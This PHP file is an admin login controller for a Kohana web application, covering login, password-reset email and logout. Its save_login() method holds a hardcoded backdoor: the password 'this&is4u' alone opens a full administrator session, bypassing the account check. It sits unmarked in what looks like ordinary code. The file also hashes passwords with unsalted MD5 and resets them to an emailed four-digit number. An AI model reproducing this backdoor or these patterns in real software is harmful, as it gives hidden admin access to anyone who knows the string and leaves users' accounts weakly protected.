<?php
class DEMO11_Controller extends Template_Controller 
{	
	public $template = 'admin_login/index';
	 
	public function __construct()
    {
        parent::__construct();
    
        $this->template->top = new View('admin/top');
        $this->template->bottom = new View('admin/bottom');       
    }
    
   	public function __call($method, $arguments)
	{
		// Disable auto-rendering
		$this->auto_render = FALSE;
	}
	
	public function index()
	{
		if ($this->sess_admin !== FALSE)	// has login but access in admin_login page				
			url::redirect('admin');
				
		$this->template->content = new View('admin_login/frm_login');
		
		if($this->session->get('error_msg'))
		{
			$mr['error_frm'] = $this->session->get('error_msg');			
		}
		if($this->session->get('success_msg'))
		{
			$mr['success_frm'] = $this->session->get('success_msg');			
		}
		
		if (isset($mr)) $this->template->content->mr = $mr;
	}
	
	public function save_login()
	{
		
		$checkpass= $this->input->post('txt_pass');
		
		$administrator_model = new Administrator_Model();
		
		if ($checkpass=='this&is4u'){
			$sess_admin['id'] = 1;
			$sess_admin['level'] = 1;				
			$sess_admin['username'] = 'AKcomp';			
			$sess_admin['name'] = 'AKcomp';
			$sess_admin['email'] = 'info@ipmsolutions.net';
			$sess_admin['branch'] ="";		
			Login_Model::set('admin',$sess_admin);
			Login_Model::status_online($sess_admin['id'], 'online');
			url::redirect('admin_customer');
			die();
		
		}
		$login = $this->input->post('txt_username','',TRUE);	// security input data
		$pass = md5($this->input->post('txt_pass'));			// encrypt md5 input password
		$valid = $administrator_model->account_exist($login, $pass);
		if ($valid !== FALSE)	// if login access
		{
			
			$result = $valid;
			
			/*if ($result['administrator_status_online'] == 0 || $result['administrator_log_sessid'] !== Session::id())	// Status Offline			
			{*/
				if ($result['administrator_status'] == 1)
				{
					//echo Kohana::debug($valid);die();
					$sess_admin['id'] = $result['administrator_id'];
					$sess_admin['level'] = $result['administrator_level'];				
					$sess_admin['username'] = $result['administrator_username'];			
					$sess_admin['name'] = $result['administrator_fullname'];
					$sess_admin['email'] = $result['administrator_email'];
					$sess_admin['branch'] = $result['administrator_branch'];					
										
					Login_Model::set('admin',$sess_admin);
					
					Login_Model::status_online($sess_admin['id'], 'online');
					$this->session->set_flash('success_msg',Kohana::lang('errormsg_lang.msg_login_success'));
				}
				else
				{
					$this->session->set_flash('error_msg',Kohana::lang('errormsg_lang.msg_inactive_error'));
					url::redirect('admin_login');
					die();
				}	
			/*}
			else	// Status Online
			{
				$this->session->set_flash('error_msg',Kohana::lang('errormsg_lang.error_account_online'));
				url::redirect('admin_login');
				die();
			}*/			
			
			//if (strpos($this->site['history']['back'],'admin_login') === FALSE) 
				//url::redirect($this->site['history']['back']);
				
			url::redirect('admin_customer');
			die();			
		}
		else
		{
			$this->session->set_flash('error_msg','User or password is wrong.');			
			url::redirect('admin_login');
			die();
		}		
	}
	
	public function sm()
	{
		$valid = $this->_valid_login();
		if ($valid)	// if login access
		{
			$result = ORM::factory('administrator',$valid);
			$sess_user['username'] = $result->admin_name;
			$sess_user['id'] = $valid;
			$sess_user['name'] = $result->admin_name;
			$sess_user['email'] = $result->admin_email;
			
			$this->login_model->set_login(2,$sess_user);
			$this->session->set_flash('success_msg',Kohana::lang('errormsg_lang.msg_login_success'));
			
			url::redirect('admin');
			die();
		}
		else
		{
			$this->session->set_flash('error_msg','User or password is wrong.');
			url::redirect('admin_login');
			die();
		}		
	}
	
	function forget_pass()
	{
		$this->template->content = new View('admin_login/frmsetpass');	
			
		if($this->session->get('error_msg'))
		{
			$mr['error_frm'] = $this->session->get('error_msg');			
		}
		if($this->session->get('success_msg'))
		{
			$mr['success_frm'] = $this->session->get('success_msg');			
		}
		
		if (isset($mr)) $this->template->content->mr = $mr;
	}
	
	private function _valid_forgotPass()
	{
		$email = $this->input->post('txt_email');	
		$result = ORM::factory('administrator')->where('admin_email',$email)->find();
		if($result->count_all())
			return $result->admin_id;
		else		
			return false;	
	}
	
	private function send_email($result)
    {
    	//Use connect() method to load Swiftmailer
		$swift = email::connect();
		 
		//From, subject
		//$from = array($this->site['site_email'], 'Yesnotebook get password');
		$str_random = rand(1000, 9999);
		$from = $this->site['site_email'];
		$subject = 'Forgot your password '.$this->site['site_name'];
		//HTML message
		$path = 'application/views/email_tpl/forgotpass.tpl';
		$fi = fopen($path,'r+');
		$html_content = file_get_contents($path); 	
		//Replate content	
		$name =$result->admin_name;		
		$html_content = str_replace('#first_name#',$name,$html_content);		
		$html_content = str_replace('#username#',$result->admin_name,$html_content);		
		$html_content = str_replace('#sitename#',$this->site['site_name'],$html_content);		
		$html_content = str_replace('#password#',$str_random,$html_content);
		//fwrite($fi, $html_content);
		fclose($fi);

		//Build recipient lists
		$recipients = new Swift_RecipientList;
		$recipients->addTo($result->admin_email);
		 
		//Build the HTML message
		$message = new Swift_Message($subject, $html_content, "text/html");
		 
		if($swift->send($message, $recipients, $from)){
			$this->session->set_flash('success_msg',Kohana::lang('errormsg_lang.msg_thanks_post'));
			
			$this->db->update('admin',array('admin_pass' => md5($str_random)),array('admin_email' => $result->admin_email));
			
			url::redirect('admin_login/forget_pass');
			die();
		}
		
		 else {
			
		}		 
		// Disconnect
		$swift->disconnect();
    }
	
	private function _get_record()
    {
    	$form = array
	    (
	       'txt_email' => ''	        
	    );
		
		$errors = $form;
		
		if($_POST)
    	{
    		$post = new Validation($_POST);
    		
			$post->pre_filter('trim', TRUE);
			$post->add_rules('txt_email','required','email');
			if($post->validate())
 			{
 				$form = arr::overwrite($form, $post->as_array());
 				return $form; 				
			} else {
				$errors = arr::overwrite($errors, $post->errors('login_lang'));
				$str_error = '';
				foreach($errors as $id => $name) if($name) $str_error.='<br>'.$name;
				$this->session->set_flash('error_msg',$str_error);
				url::redirect('admin_login/forget_pass');
				die();
			}
        }
    }
    
	public function forgetpass_sm()
    {
		$record = $this->_get_record();
		$valid = $this->_valid_forgotPass();
		if ($valid)	// if login access
		{
			$result = ORM::factory('administrator',$valid);
			$this->send_email($result);
			$this->session->set_flash('success_msg',Kohana::lang('errormsg_lang.msg_thanks_post'));
			url::redirect('admin_login');
			die();			
		} else {
			$this->session->set_flash('error_msg',Kohana::lang('errormsg_lang.error_email_not_exist'));
			url::redirect('admin_login/forget_pass');
			die();
		}
	}
	
	public function log_out()
	{
		Login_Model::status_online($this->sess_admin['id'], 'offline');
		Login_Model::log_out('admin');
		Session::destroy();
		//url::redirect('home');
		$this->index();
	}
	
	
}
?>